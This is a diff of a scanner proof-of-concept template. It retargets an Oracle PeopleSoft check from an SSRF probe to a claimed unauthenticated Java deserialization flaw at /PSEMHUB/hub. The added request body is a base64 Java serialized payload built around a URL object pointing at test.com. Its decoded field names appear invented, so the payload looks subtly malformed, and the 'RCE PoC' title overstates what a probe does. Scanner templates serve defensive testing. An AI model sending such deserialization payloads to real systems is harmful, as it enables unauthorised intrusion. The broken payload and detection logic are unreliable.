@@ -1,32 +1,35 @@
 [info]
 author = "ave"
-description = "检测 Oracle PeopleSoft PeopleTools Update Environment Management 组件缺失认证漏洞（CWE-306），通过向 /PSIGW/HttpListeningConnector 发送未授权 SOAP 请求触发 SSRF，验证目标是否存在该漏洞"
+description = "通过向 /PSEMHUB/hub 发送包含 Java 反序列化 payload 的 POST 请求，检测 Oracle PeopleSoft PeopleTools 8.61/8.62 的 Updates Environment Management 组件是否存在未授权 Java 反序列化漏洞（CVE-2026-35273）。若响应包含 Java 序列化数据特征（rO0ABX）且状态码为 200，则判定存在漏洞。"
 id = "POC-AVE-2026-0100"
-name = "PoC for AVE-2026-0100"
+name = "Oracle PeopleSoft PeopleTools PSEMHUB Pre-Auth Java Deserialization RCE PoC"
 severity = "critical"
-tags = [
-    "cve-2026-35273",
-    "ave-2026-0100",
-]
+tags = ["ave-2026-0100"]
 vuln_id = [
     "CVE-2026-35273",
     "AVE-2026-0100",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/PSIGW/HttpListeningConnector"
+path = "/{{BaseURL}}/PSEMHUB/hub"
 protocol = "http"
 
 [poc.requests.body]
-content = "<Envelope><Body><EnvironmentManagement><sourceURL>http://localhost/</sourceURL></EnvironmentManagement></Body></Envelope>"
+content = "OPERATION=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYl7YaROiWxAwAIAAkSABRjYXNoZWRWZXJzaW9uRmlsZUkADGZpbGVzVGltZVN0YW1wSgAQaGFzaENvZGVNYXhBZ2VzSgAOaGFzaENvZGVNaW5BZ2VzSgATbW9kaWZpY2F0aW9uQ291bnRJAAVwb3J0SQAKc2VyaWFsVmVyc0kABXZhbHVlWgALYXV0aG9yaXRpZXN4cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXhyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYw4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAQAAAAAXh0AAl0ZXN0LmNvbQ=="
 type = "raw"
 
 [poc.requests.headers]
-Content-Type = "application/xml"
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["rO0ABX"]
 
 [[poc.requests.matchers]]
 expect = true
